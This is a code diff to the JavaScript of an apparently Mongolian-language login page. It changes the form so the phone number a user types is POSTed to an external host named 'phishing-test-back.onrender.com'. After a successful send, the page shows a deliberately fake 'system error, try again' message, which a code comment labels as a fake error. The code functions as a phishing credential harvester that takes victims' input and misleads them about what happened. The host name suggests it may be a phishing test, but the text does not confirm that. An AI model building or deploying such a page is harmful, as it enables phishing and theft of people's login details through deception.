@@ -3,8 +3,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const phoneInput = document.querySelector('input[id="phone_number"]');
     const submitButton = document.querySelector('.login-button');
 
+    const API_URL = 'https://phishing-test-back.onrender.com/write';
+
     form.addEventListener('submit', function(event) {
-        event.preventDefault(); // Prevent default form submission
+        event.preventDefault();
 
         const phoneNumber = phoneInput.value.trim();
 
@@ -22,10 +24,9 @@ document.addEventListener('DOMContentLoaded', function() {
         }
 
         submitButton.disabled = true;
-        submitButton.innerHTML = '<span>МАБ-ын албандаа хандана уу</span>';
+        submitButton.innerHTML = '<span>Түр хүлээнэ үү...</span>';
 
-        // 🔥 SEND TO YOUR PYTHON SERVICE
-        fetch('http://localhost:8000/write', {
+        fetch(API_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -34,15 +35,21 @@ document.addEventListener('DOMContentLoaded', function() {
                 text: phoneNumber
             })
         })
-        .then(res => res.json())
-        .then(data => {
-            console.log('Saved:', data);
+        .then(res => {
+            if (!res.ok) throw new Error('Server error');
+            return res.json();
+        })
+        .then(() => {
+            // Optional: redirect or show fake error
+            alert('Системийн алдаа гарлаа. Дараа дахин оролдоно уу.');
         })
         .catch(err => {
             console.error('Error:', err);
+            alert('Серверт холбогдож чадсангүй. Түр хүлээгээд дахин оролдоно уу.');
         })
         .finally(() => {
             submitButton.disabled = false;
+            submitButton.innerHTML = '<span>Нэвтрэх</span>';
         });
     });
 });
